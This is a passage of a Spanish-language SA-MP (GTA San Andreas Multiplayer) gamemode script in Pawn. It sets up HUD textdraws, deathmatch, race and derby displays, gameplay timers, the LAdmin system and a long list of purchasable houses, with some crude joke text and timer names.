		TextDrawSetProportional(LLine1[i],1);
		TextDrawSetShadow(LLine1[i],1);
		//---------------------------------------------------------->
		LLine2[i] = TextDrawCreate(609.000000,416.000000,"L");
		TextDrawUseBox(LLine2[i],1);
		TextDrawBoxColor(LLine2[i],0xffffff33);
		TextDrawTextSize(LLine2[i],457.000000,-9.000000);
		TextDrawBackgroundColor(LLine2[i],0x000000ff);
		TextDrawFont(LLine2[i],3);
		TextDrawLetterSize(LLine2[i],-0.000000,-0.400000);
		TextDrawColor(LLine2[i],TopLinesColor);
		TextDrawSetOutline(LLine2[i],1);
		TextDrawSetProportional(LLine2[i],1);
		TextDrawSetShadow(LLine2[i],1);
		#endif
		//---------------------------------------------------------->
		#if LogoName
		LCredits[i] = TextDrawCreate(487.000000,320.000000,SpeedoLogoText);
		TextDrawAlignment(LCredits[i],0);
		TextDrawBackgroundColor(LCredits[i],0x000000ff);
		TextDrawFont(LCredits[i],0);
		TextDrawLetterSize(LCredits[i],0.399999,1.400000);
		TextDrawColor(LCredits[i],LogoColor);
		TextDrawSetOutline(LCredits[i],1);
		TextDrawSetProportional(LCredits[i],1);
		TextDrawSetShadow(LCredits[i],1);
		#endif
		//---------------------------------------------------------->
		#if TextSideLines
		LLine3[i] = TextDrawCreate(466.000000,343.000000,"T");
		TextDrawUseBox(LLine3[i],1);
		TextDrawBoxColor(LLine3[i],0xffffff33);
		TextDrawTextSize(LLine3[i],457.000000,0.000000);
		TextDrawAlignment(LLine3[i],0);
		TextDrawBackgroundColor(LLine3[i],0x000000ff);
		TextDrawFont(LLine3[i],3);
		TextDrawLetterSize(LLine3[i],-0.000000,7.499998);
		TextDrawColor(LLine3[i],SideLinesColor);
		TextDrawSetOutline(LLine3[i],1);
		TextDrawSetProportional(LLine3[i],1);
		TextDrawSetShadow(LLine3[i],1);
		//---------------------------------------------------------->
		LLine4[i] = TextDrawCreate(607.000000,343.000000,"T");
		TextDrawUseBox(LLine4[i],1);
		TextDrawBoxColor(LLine4[i],0xffffff33);
		TextDrawTextSize(LLine4[i],603.000000,-6.000000);
		TextDrawAlignment(LLine4[i],0);
		TextDrawBackgroundColor(LLine4[i],0x000000ff);
		TextDrawFont(LLine4[i],3);
		TextDrawLetterSize(LLine4[i],-0.000000,7.499999);
		TextDrawColor(LLine4[i],SideLinesColor);
		TextDrawSetOutline(LLine4[i],1);
		TextDrawSetProportional(LLine4[i],1);
		TextDrawSetShadow(LLine4[i],1);
		#endif
		//---------------------------------------------------------->
		format(lstring, sizeof(lstring), "Initializing...");
		LFunc[i] = TextDrawCreate(466.000000,343.000000,lstring);
		TextDrawAlignment(LFunc[i],0);
		TextDrawBackgroundColor(LFunc[i],0x000000ff);
		TextDrawFont(LFunc[i],1);
		TextDrawLetterSize(LFunc[i],0.299999,1.200000);
		TextDrawColor(LFunc[i],0xffffffff);
		TextDrawSetOutline(LFunc[i],1);
		TextDrawSetProportional(LFunc[i],1);
		TextDrawSetShadow(LFunc[i],1);
		//---------------------------------------------------------->
		format(lstr, sizeof(lstr), "Initializing...");
		Lmph[i] = TextDrawCreate(466.000000,400.000000,lstr);
		TextDrawAlignment(Lmph[i],0);
		TextDrawBackgroundColor(Lmph[i],0x000000ff);
		TextDrawFont(Lmph[i],1);
		TextDrawLetterSize(Lmph[i],0.299999,1.000000);
		TextDrawColor(Lmph[i],0xffffffff);
		TextDrawSetOutline(Lmph[i],1);
		TextDrawSetProportional(Lmph[i],1);
		TextDrawSetShadow(Lmph[i],1);
		}
/////////////////////////////////////////////////////////////////////////
	TDeathmatch = TextDrawCreate(2.000000, 430.000000, "Deathmatch");
	TextDrawBackgroundColor(TDeathmatch, 255);
	TextDrawFont(TDeathmatch, 0);
	TextDrawLetterSize(TDeathmatch, 0.460000, 1.799999);
	TextDrawColor(TDeathmatch, -16776961);
	TextDrawSetOutline(TDeathmatch, 1);
	TextDrawSetProportional(TDeathmatch, 1);

	TJugadores = TextDrawCreate(190.000000, 430.000000, "Jugadores:");
	TextDrawBackgroundColor(TJugadores, 255);
	TextDrawFont(TJugadores, 0);
	TextDrawLetterSize(TJugadores, 0.460000, 1.799999);
	TextDrawColor(TJugadores, 16711935);
	TextDrawSetOutline(TJugadores, 1);
	TextDrawSetProportional(TJugadores, 1);

	TJugadores2 = TextDrawCreate(251.000000, 432.000000, "0");
	TextDrawBackgroundColor(TJugadores2, 255);
	TextDrawFont(TJugadores2, 1);
	TextDrawLetterSize(TJugadores2, 0.460000, 1.599998);
	TextDrawColor(TJugadores2, -16711681);
	TextDrawSetOutline(TJugadores2, 1);
	TextDrawSetProportional(TJugadores2, 1);
	TextDrawSetShadow(TJugadores2, 1);

	TComandosDM = TextDrawCreate(375.000000, 432.000000, "Usa /salir para salir del minijuego");
	TextDrawBackgroundColor(TComandosDM, 255);
	TextDrawFont(TComandosDM, 1);
	TextDrawLetterSize(TComandosDM, 0.400000, 1.599998);
	TextDrawColor(TComandosDM, 0xC0C0C0FF);
	TextDrawSetOutline(TComandosDM, 1);
	TextDrawSetProportional(TComandosDM, 1);
	TextDrawSetShadow(TComandosDM, 1);

	//======================= CONTADOR DE JUGADORES ==================//
	Deathmatch[InDM1] = 0;
	Deathmatch[InDM2] = 0;
	Deathmatch[InDM3] = 0;
	Deathmatch[InDM4] = 0;
	Deathmatch[InMiniDM] = 0;
	Deathmatch[InMiniDM2] = 0;
	Deathmatch[InDesmadre] = 0;
	Deathmatch[InBoxDM] = 0;
	Deathmatch[InProDM] = 0;
	Deathmatch[InMinigunDM] = 0;
	Deathmatch[InSniperDM] = 0;
	Deathmatch[InGuerraDM] = 0;
	Derby[InDerby] = 0;

	LoadRaceNames();
	LoadAutoRace(RaceNames[random(TotalRaces)]);
	AutomaticRace = true;

	TRace = TextDrawCreate(2.000000, 430.000000, "Carrera");
	TextDrawBackgroundColor(TRace, 255);
	TextDrawFont(TRace, 0);
	TextDrawLetterSize(TRace, 0.460000, 1.799999);
	TextDrawColor(TRace, -16776961);
	TextDrawSetOutline(TRace, 1);
	TextDrawSetProportional(TRace, 1);
	
	TDerby = TextDrawCreate(2.000000, 430.000000, "Derby");
	TextDrawBackgroundColor(TDerby, 255);
	TextDrawFont(TDerby, 0);
	TextDrawLetterSize(TDerby, 0.460000, 1.799999);
	TextDrawColor(TDerby, -16776961);
	TextDrawSetOutline(TDerby, 1);
	TextDrawSetProportional(TDerby, 1);

	TRaceJugadores = TextDrawCreate(145.000000, 430.000000, "Jugadores:");
	TextDrawBackgroundColor(TRaceJugadores, 255);
	TextDrawFont(TRaceJugadores, 0);
	TextDrawLetterSize(TRaceJugadores, 0.460000, 1.799999);
	TextDrawColor(TRaceJugadores, 16711935);
	TextDrawSetOutline(TRaceJugadores, 1);
	TextDrawSetProportional(TRaceJugadores, 1);

	TRaceTiempoRestante = TextDrawCreate(290, 430.000000, "Tiempo Restante:");
	TextDrawBackgroundColor(TRaceTiempoRestante, 255);
	TextDrawFont(TRaceTiempoRestante, 0);
	TextDrawLetterSize(TRaceTiempoRestante, 0.460000, 1.799999);
	TextDrawColor(TRaceTiempoRestante, 16711935);
	TextDrawSetOutline(TRaceTiempoRestante, 1);
	TextDrawSetProportional(TRaceTiempoRestante, 1);

	TCheckpoint = TextDrawCreate(500.000000, 430.000000, "Checkpoint:");
	TextDrawBackgroundColor(TCheckpoint, 255);
	TextDrawFont(TCheckpoint, 0);
	TextDrawLetterSize(TCheckpoint, 0.460000, 1.799999);
	TextDrawColor(TCheckpoint, 16711935);
	TextDrawSetOutline(TCheckpoint, 1);
	TextDrawSetProportional(TCheckpoint, 1);

	TBox = TextDrawCreate(660.000000, 435.000000, "_");
	TextDrawBackgroundColor(TBox, 0xFFFFFFFF);
	TextDrawFont(TBox, 1);
	TextDrawLetterSize(TBox, 1.500000, 1.299999);
	TextDrawColor(TBox, -1);
	TextDrawSetOutline(TBox, 0);
	TextDrawSetProportional(TBox, 1);
	TextDrawSetShadow(TBox, 1);
	TextDrawUseBox(TBox, 1);
	TextDrawBoxColor(TBox, 0x00000033);
	TextDrawTextSize(TBox, -20.000000, 82.000000);

	TComandos = TextDrawCreate(5.000000, 431.000000, "/Register - /Comandos - /Admins - /Teles - /Reglas - /Vips - /Vehiculos - /Armas - /Colores - /Objetos");
	TextDrawBackgroundColor(TComandos, 255);
	TextDrawFont(TComandos, 2);
	TextDrawLetterSize(TComandos, 0.270000, 1.700000);
	TextDrawColor(TComandos, -16776961);
	TextDrawSetOutline(TComandos, 1);
	TextDrawSetProportional(TComandos, 1);
	TextDrawSetShadow(TComandos, 1);

	Guerratotal = TextDrawCreate(500.000000, 1.000000, "  Guerra Total");
	TextDrawBackgroundColor(Guerratotal, 255);
	TextDrawFont(Guerratotal, 0);
	TextDrawLetterSize(Guerratotal, 0.769999, 2.100000);
	TextDrawColor(Guerratotal, -16776961);
	TextDrawSetOutline(Guerratotal, 0);
	TextDrawSetProportional(Guerratotal, 1);
	TextDrawSetShadow(Guerratotal, 1);

	Guerratotal1 = TextDrawCreate(500.500000, 20.000000, "     Activada");
	TextDrawBackgroundColor(Guerratotal1, 255);
	TextDrawFont(Guerratotal1, 0);
	TextDrawLetterSize(Guerratotal1, 0.769999, 2.100000);
	TextDrawColor(Guerratotal1, -1);
	TextDrawSetOutline(Guerratotal1, 0);
	TextDrawSetProportional(Guerratotal1, 1);
	TextDrawSetShadow(Guerratotal1, 1);

	Puto = CreateObject(19364, -1996.72021, 242.05859, 31.59750,   -1.00000, 0.00000, -7.00000);
	SetObjectMaterialText(Puto, "{FF0000}DESTRUCCION LATINA\n{000000}————————————————\n{FFFFFF}Puto el que lo lea.\n\nPuto el que lo siga leyendo.\n\nPuto el que lo terminó de leer.\n{000000}————————————————", 0,
	OBJECT_MATERIAL_SIZE_256x256, "Arial", 21, 0, 0xFF0082FF, 0xCCAAAAAA, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	
	//===============================SISTEMA DE DERBY====================================//
	for(new i = 0; i != MAX_DERBY_OBJECTS; i ++) DERBY_OBJECTS[i][OBJECT_ID] = INVALID_OBJECT_ID;
    LoadDerbyNames("DERBY/lista_derby.txt");
	CheckDerbys();

	TD_DERBY_Message = TextDrawCreate(320.0, 325.0, "_");
	TextDrawLetterSize(TD_DERBY_Message, 0.295051, 1.197498);
	TextDrawAlignment(TD_DERBY_Message, 2);
	TextDrawColor(TD_DERBY_Message, -1);
	TextDrawSetShadow(TD_DERBY_Message, 0);
	TextDrawSetOutline(TD_DERBY_Message, 1);
	TextDrawBackgroundColor(TD_DERBY_Message, 255);
	TextDrawFont(TD_DERBY_Message, 3);
	TextDrawSetProportional(TD_DERBY_Message, 1);
	TextDrawSetShadow(TD_DERBY_Message, 0);

	TD_DERBY = TextDrawCreate(320.0, 345.0, "_");
	TextDrawLetterSize(TD_DERBY, 0.295051, 1.197498);
	TextDrawAlignment(TD_DERBY, 2);
	TextDrawColor(TD_DERBY, -1);
	TextDrawSetShadow(TD_DERBY, 0);
	TextDrawSetOutline(TD_DERBY, 1);
	TextDrawBackgroundColor(TD_DERBY, 255);
	TextDrawFont(TD_DERBY, 3);
	TextDrawSetProportional(TD_DERBY, 1);
	TextDrawSetShadow(TD_DERBY, 0);

	print("\r\n\r\n----------------------------------------------");
	print("  Sistema Derby "DERBY_SYSTEM_VERSION" a "DERBY_SYSTEM_DATE" por adri1. Editado por Psicoloco.");
	print("----------------------------------------------\r\n\r\n");
	
	//---------------------------Vehicle healthbar stuff----------------------------

 	vehiclehpbar[0] = TextDrawCreate(549.0, 50.0, "KABOOM!");
	TextDrawUseBox(vehiclehpbar[0], true);
	TextDrawBoxColor(vehiclehpbar[0], COLOR_BRIGHTRED);
	TextDrawSetShadow(vehiclehpbar[0],0);
	TextDrawTextSize(vehiclehpbar[0], 625, 0);

	vehiclehpbar[1] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[1], true);
	TextDrawBoxColor(vehiclehpbar[1], COLOR_BRIGHTRED);
	TextDrawSetShadow(vehiclehpbar[1],0);
	TextDrawTextSize(vehiclehpbar[1], 551, 0);

	vehiclehpbar[2] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[2], true);
	TextDrawBoxColor(vehiclehpbar[2], COLOR_BRIGHTRED);
	TextDrawSetShadow(vehiclehpbar[2],0);
	TextDrawTextSize(vehiclehpbar[2], 556, 0);

	vehiclehpbar[3] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[3], true);
	TextDrawBoxColor(vehiclehpbar[3], COLOR_BRIGHTRED);
	TextDrawSetShadow(vehiclehpbar[3],0);
	TextDrawTextSize(vehiclehpbar[3], 561, 0);

	vehiclehpbar[4] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[4], true);
	TextDrawBoxColor(vehiclehpbar[4], COLOR_YELLOW);
	TextDrawSetShadow(vehiclehpbar[4],0);
	TextDrawTextSize(vehiclehpbar[4], 566, 0);

	vehiclehpbar[5] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[5], true);
	TextDrawBoxColor(vehiclehpbar[5], COLOR_YELLOW);
	TextDrawSetShadow(vehiclehpbar[5],0);
	TextDrawTextSize(vehiclehpbar[5], 571, 0);

	vehiclehpbar[6] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[6], true);
	TextDrawBoxColor(vehiclehpbar[6], COLOR_YELLOW);
	TextDrawSetShadow(vehiclehpbar[6],0);
	TextDrawTextSize(vehiclehpbar[6], 576, 0);

	vehiclehpbar[7] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[7], true);
	TextDrawBoxColor(vehiclehpbar[7], COLOR_YELLOW);
	TextDrawSetShadow(vehiclehpbar[7],0);
	TextDrawTextSize(vehiclehpbar[7], 581, 0);

	vehiclehpbar[8] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[8], true);
	TextDrawBoxColor(vehiclehpbar[8], COLOR_GREEN);
	TextDrawSetShadow(vehiclehpbar[8],0);
	TextDrawTextSize(vehiclehpbar[8], 586, 0);

	vehiclehpbar[9] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[9], true);
	TextDrawBoxColor(vehiclehpbar[9], COLOR_GREEN);
	TextDrawSetShadow(vehiclehpbar[9],0);
	TextDrawTextSize(vehiclehpbar[9], 591, 0);

	vehiclehpbar[10] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[10], true);
	TextDrawBoxColor(vehiclehpbar[10], COLOR_GREEN);
	TextDrawSetShadow(vehiclehpbar[10],0);
	TextDrawTextSize(vehiclehpbar[10], 596, 0);

	vehiclehpbar[11] = TextDrawCreate(551.0, 59.0, " ");
	TextDrawUseBox(vehiclehpbar[11], true);
	TextDrawBoxColor(vehiclehpbar[11], COLOR_GREEN);
	TextDrawSetShadow(vehiclehpbar[11],0);
	TextDrawTextSize(vehiclehpbar[11], 602, 0);

	vehiclehpbar[12] = TextDrawCreate(549.0, 50.0, "EXTREME!");
	TextDrawUseBox(vehiclehpbar[12], true);
	TextDrawBoxColor(vehiclehpbar[12], COLOR_GREEN);
	TextDrawSetShadow(vehiclehpbar[12],0);
	TextDrawTextSize(vehiclehpbar[12], 625, 0);

//========================SISTEMA DE CARGA=================================//
	// ---------------------        TextDrawX        --------------- //
	box =
	TextDrawCreate			(199.000000, 182.000000, "_");
	TextDrawBackgroundColor (box, 255);
	TextDrawFont			(box, 2);
	TextDrawLetterSize		(box, 1.200000, 8.000000);
	TextDrawColor			(box, -1);
	TextDrawSetOutline		(box, 0);
	TextDrawSetProportional	(box, 1);
	TextDrawSetShadow		(box, 1);
	TextDrawUseBox			(box, 1);
	TextDrawBoxColor		(box, 75);
	TextDrawTextSize		(box, 436.000000, 90.000000);

	cargando =
	TextDrawCreate			(232.000000, 192.000000, "CARGANDO");
	TextDrawBackgroundColor	(cargando, 255);
	TextDrawFont			(cargando, 2);
	TextDrawLetterSize		(cargando, 0.800000, 3.000000);
	TextDrawColor			(cargando, -1);
	TextDrawSetOutline		(cargando, 0);
	TextDrawSetProportional	(cargando, 1);
	TextDrawSetShadow		(cargando, 1);

	looking =
	TextDrawCreate			(203.000000, 223.000000, "");
	TextDrawBackgroundColor	(looking, 255);
	TextDrawFont			(looking, 2);
	TextDrawLetterSize		(looking, 0.260000, 1.000000);
	TextDrawColor			(looking, -1);
	TextDrawSetOutline		(looking, 0);
	TextDrawSetProportional	(looking, 1);
	TextDrawSetShadow		(looking, 1);
	
	streamer =
	TextDrawCreate(210.000000, 214.000000, "CARGANDO OBJETOS ESPERA POR FAVOR");
	TextDrawBackgroundColor	(streamer, 255);
	TextDrawFont			(streamer, 2);
	TextDrawLetterSize		(streamer, 0.260000, 1.300000);
	TextDrawColor			(streamer, -1);
	TextDrawSetOutline		(streamer, 0);
	TextDrawSetProportional	(streamer, 1);
	TextDrawSetShadow		(streamer, 1);

//---------------------------Gamemode Settings----------------------------------
	print("\nLoading Gamemode(MXTDM~FR [0.3.7])");
	SetGameModeText("MXTDM~FR [0.3.7]");
	ShowNameTags(1);
	ShowPlayerMarkers(1);
	SetWorldTime(19);
	UsePlayerPedAnims();
 	BankRobbedRecently = 0;
//----------------------------------Timers--------------------------------------
    SetTimer("VHPBarUpdate",1005,1);
    EmpezarGT=SetTimer("GuerraTotalOn",3600000,1);
	SetTimer("PayDay",1800000,1);
	//SetTimer("PayDay",3600000,1);
	SetTimer("ReqBkRecentTime",50000,1);
	SetTimer("fixedcarrecenttimer",1003,1);
	SetTimer("BeenReped",60000,1);
	SetTimer("RapedPlayerRecent",60030,1);
	SetTimer("VehicleRepairedRecent",120000,1);
	SetTimer("RobbedPlayerRecent",60040,1);
	SetTimer("StoleCopCarRecentTimer",60070,1);
	SetTimer("InfectedPlayerRecent",61000,1);
	SetTimer("JailFood",120000,1);
	SetTimer("commitedcrimerecent",1035,1);
	SetTimer("AutoUnjail",1020,1);
	SetTimer("RapedPlayerRecent",60005,1);

	//SetTimer("BackupInfo",120003,1);
	SetTimer("WantedLevelReduce",600000,1);
	SetTimer("VehicleCleanup",600000,1);
	SetTimer("inactiveplayercheck",86400000,1);

	AntiDeAMX();
//----------------------------------Ladmin--------------------------------------
	print("\n________________________________________");
	print("________________________________________");
	print("           LAdmin Loading...            ");
	print("________________________________________");

	if(!fexist("ladmin/"))
	{
		print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin");
		return 1;
	}
	if(!fexist("ladmin/logs/"))
	{
		print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/logs");
		return 1;
	}
	if(!fexist("ladmin/config/"))
	{
		print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/config");
		return 1;
	}
	if(!fexist("ladmin/users/"))
	{
		print("\n\n > WARNING: Folder Missing From Scriptfiles\n");
	  	SetTimerEx("PrintWarning",2500,0,"s","ladmin/users");
		return 1;
	}
	UpdateConfig();

	#if defined DISPLAY_CONFIG
	ConfigInConsole();
	#endif

	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) OnPlayerConnect(i);
	for(new i = 1; i < MAX_CHAT_LINES; i++) Chat[i] = "<none>";
	for(new i = 1; i < MAX_REPORTS; i++) Reports[i] = "<none>";

	PingTimer = SetTimer("PingKick",10000,1);
	GodTimer = SetTimer("GodUpdate",2000,1);
	xReactionTimer = SetTimer("xReactionTest", TIME, 1);

	new year,month,day;	getdate(year, month, day);
	new hour,minute,second; gettime(hour,minute,second);

	print("________________________________________");
	print("           LAdmin Version 4.0           ");
	print("                Loaded                  ");
	print("________________________________________");
	printf("     Date: %d/%d/%d  Time: %d:%d :%d   ",day,month,year, hour, minute, second);
	print("________________________________________");
	print("________________________________________\n");
//--------------------------------Load Businesses-------------------------------
	for(new i = 0;i<3;i++) {
		CreateDynamicPickup(1239,B_ICON_TYPE,Pickup[i][0],Pickup[i][1],Pickup[i][2]);
	}
	bizcount = CountBusinesses(B_FILE_LOAD);
	LoadBusinesses();
	print(">--------------------------------------------------------------------------");
 	new bizmess[50];
 	format(bizmess,50,"%d Businesses Successfully loaded and created",bizcount);
 	printf(bizmess);
//--------------------------------Load Vehicles---------------------------------
    vehcount = CountVehicles(V_FILE_LOAD);
	LoadVehicles();
 	for(new c=1;c<=vehcount;c++)
	{
	 	ModVehicle(c);
 	}
//	print(">--------------------------------------------------------------------------");
 	new vehmess[50];
 	format(vehmess,50,"%d Vehicles Successfully loaded and created",vehcount);
 	printf(vehmess);
	print(">--------------------------------------------------------------------------");
 	printf("");
	print(">--------------------------------------------------------------------------");
	print("Business and Vehicle Systems Status - 100% - Systems Ready...");
	print(">--------------------------------------------------------------------------");
//	printf("");
//-----------------------------------SHS----------------------------------------
	AddHouse(0, -2723.707763, -191.290557, 4.335937, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 1); //Big house
	AddHouse(1, -2723.094970, -178.768417, 7.203125, 2496.65, -1696.55, 1014.74, 30000, 29000, 3, 2);//A small house ;)
	AddHouse(2, -2722.484619, -166.497085, 5.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 3);//Big house
	AddHouse(3, -2723.282714, -162.595901, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 4);//Big house
	AddHouse(4, -2722.977539, -139.726028, 7.203125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 5);//Big house
	AddHouse(5, -2723.020996, -127.889617, 5.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 6);//Big house
	AddHouse(6, -2723.054687, -112.740875, 7.203125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 7);//Big house
	AddHouse(7, -2723.263916, -105.408699, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 8);//Big house
	AddHouse(8, -2724.548583, -92.839942, 6.809413, 225.79, 1025.77, 1084.00, 100000, 91090, 7, 9); //Big house
	AddHouse(9, -2689.312500, -89.369110, 4.335937, 225.79, 1025.77, 1084.00, 300000, 290000, 7, 10); //Big house
	AddHouse(10, -2689.340576, -101.673187, 7.203125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 11);//Big house
	AddHouse(11, -2689.618652, -114.119880, 5.000000, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 12);//Big house
	AddHouse(12, -2689.104003, -117.747894, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 13);//Big house
	AddHouse(13, -2689.413085, -140.969268, 7.203125, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 14);//Big house
	AddHouse(14, -2689.638427, -152.694717, 5.000000, 2496.65, -1696.55, 1014.74, 50000, 49000, 3, 15);//A small house ;)
	AddHouse(15, -2689.738525, -167.399414, 7.203125, 2496.65, -1696.55, 1014.74, 50000, 49000, 3, 16);//A small house ;)
	AddHouse(16, -2689.058837, -175.289321, 4.342578, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 17);//Big house
	AddHouse(17, -2687.462402, -187.970642, 7.182571, 225.79, 1025.77, 1084.00, 100000, 91090, 7, 18); //Big house
	AddHouse(18, -2645.145019, 804.590209, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 19); //A small house ;)
	AddHouse(19, -2659.705566, 803.421386, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 20); //A small house ;)
	AddHouse(20, -2738.431884, 746.748596, 49.243583, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 21); //A small house ;)
	AddHouse(21, -2670.906250, 803.568725, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 22); //A small house ;)
	AddHouse(22, -2738.488037, 755.320983, 52.807075, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 23); //A small house ;)
	AddHouse(23, -2738.322509, 758.700988, 54.382812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 24); //A small house ;)
	AddHouse(24, -2677.453857, 804.247070, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 25); //A small house ;)
	AddHouse(25, -2687.536621, 804.373962, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 26); //A small house ;)
	AddHouse(26, -2739.829101, 771.551147, 54.382812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 27); //A small house ;)
	AddHouse(27, -2698.829101, 804.574340, 49.970275, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 28); //A small house ;)
	AddHouse(28, -2709.819335, 803.588745, 49.976562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 29); //A small house ;)
	AddHouse(29, -2738.667968, 789.242065, 54.382812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 30); //A small house ;)
	AddHouse(30, -2839.932861, 866.808837, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 31);//A small house ;)
	AddHouse(31, -2840.228027, 877.520874, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 32);//A small house ;)
	AddHouse(32, -2839.260986, 884.765930, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 33);//A small house ;)
	AddHouse(33, -2855.629882, 841.158081, 40.153347, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 34); //A small house ;)
	AddHouse(34, -2858.971435, 834.775329, 39.995605, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 35); //A small house ;)
	AddHouse(35, -2842.499023, 904.179687, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 36);//A small house ;)
	AddHouse(36, -2843.632568, 914.512756, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 37);//A small house ;)
	AddHouse(37, -2862.457031, 829.206909, 39.634624, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 38); //A small house ;)
	AddHouse(38, -2844.710937, 921.721435, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 39);//A small house ;)
	AddHouse(39, -2845.254394, 928.670715, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 40);//A small house ;)
	AddHouse(40, -2868.042480, 820.648803, 39.355697, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 41); //A small house ;)
	AddHouse(41, -2852.807617, 947.773254, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 42);//A small house ;)
	AddHouse(42, -2879.614746, 797.556945, 35.509155, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 43); //A small house ;)
	AddHouse(43, -2856.888671, 957.456726, 44.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 44);//A small house ;)
	AddHouse(44, -2879.358642, 790.245971, 35.514392, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 45); //A small house ;)
	AddHouse(45, -2859.418945, 964.335266, 44.049766, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 46);//A small house ;)
	AddHouse(46, -2881.152832, 780.006713, 35.253761, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 47); //A small house ;)
	AddHouse(47, -2874.958740, 981.459533, 40.718750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 48);//A small house ;)
	AddHouse(48, -2879.658935, 990.609252, 40.718750, 2496.65, -1696.55, 1014.74, 10000, 90000, 3, 49);//A small house ;)
	AddHouse(49, -2884.127929, 750.655822, 29.251396, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 50); //A small house ;)
	AddHouse(50, -2883.331054, 996.009216, 40.718750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 51);//A small house ;)
	AddHouse(51, -2883.860595, 743.504333, 29.251344, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 52); //A small house ;)
	AddHouse(52, -2886.203613, 1001.538513, 40.718750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 53);//A small house ;)
	AddHouse(53, -2882.252929, 736.894348, 29.347637, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 54); //A small house ;)
	AddHouse(54, -2894.520996, 1017.306091, 36.828125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 55);//A small house ;)
	AddHouse(55, -2881.262207, 726.900878, 29.235389, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 56); //A small house ;)
	AddHouse(56, -2898.056152, 1026.988037, 36.835315, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 57);//A small house ;)
	AddHouse(57, -2900.821533, 1033.518432, 36.828125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 58);//A small house ;)
	AddHouse(58, -2871.753662, 697.807617, 23.470481, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 59); //A small house ;)
	AddHouse(59, -2899.666503, 1057.129638, 32.132812, 2496.65, -1696.55, 1014.74, 10000, 90000, 3, 60);//A small house ;)
	AddHouse(60, -2869.304931, 690.805908, 23.465415, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 61); //A small house ;)
	AddHouse(61, -2899.242919, 1066.560424, 32.139984, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 62);//A small house ;)
	AddHouse(62, -2864.777343, 681.480834, 23.461896, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 63); //A small house ;)
	AddHouse(63, -2900.223876, 1073.217285, 32.132812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 64);//A small house ;)
	AddHouse(64, -2899.646484, 1080.640991, 32.132812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 65);//A small house ;)
	AddHouse(65, -2904.142822, 1101.242065, 27.070312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 66);//A small house ;)
